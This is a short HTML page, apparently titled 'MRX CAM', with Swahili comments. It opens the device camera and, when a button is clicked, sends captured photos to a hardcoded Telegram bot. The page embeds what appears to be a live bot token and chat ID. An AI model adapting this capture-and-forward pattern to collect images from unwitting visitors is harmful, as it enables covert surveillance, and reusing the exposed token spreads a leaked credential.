<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>MRX CAM ğŸ“¸</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background-color: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }

    video {
      width: 100%;
      height: auto;
      background: #000;
    }

    button {
      background: #28a745;
      border: none;
      color: white;
      padding: 14px 25px;
      font-size: 18px;
      margin-top: 15px;
      border-radius: 10px;
      cursor: pointer;
    }

    #status {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>MRX CAM LIVE ğŸ“·</h2>
  <video id="video" autoplay playsinline></video>
  <br>
  <button id="capture">ğŸ¯ Start Camera & Send</button>
  <p id="status"></p>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('capture');
    const statusText = document.getElementById('status');

    const BOT_TOKEN = '8062150039:AAHmI3ra-UPWJgM01nm-jxzd0Ck2UE3vkWg';
    const CHAT_ID = 6142705074; // â† Chat ID yako halali tayari

    // Fungua kamera
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
      .then(stream => {
        video.srcObject = stream;
        statusText.textContent = "ğŸ“¡ Kamera imefunguka!";
      })
      .catch(err => {
        statusText.textContent = "âŒ Kamera haikufunguka: " + err.message;
      });

    // Bonyeza button â†’ piga picha na tuma
    captureBtn.addEventListener('click', () => {
      statusText.textContent = "â³ Inatuma picha...";

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'picha.jpg');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            statusText.textContent = "âœ… Picha imepelekwa Telegram!";
          } else {
            statusText.textContent = "âŒ Error: " + JSON.stringify(data);
          }
        })
        .catch(err => {
          statusText.textContent = "âŒ Mtandao au bot error: " + err.message;
        });
      }, 'image/jpeg');
    });
  </script>

</body>
</html>
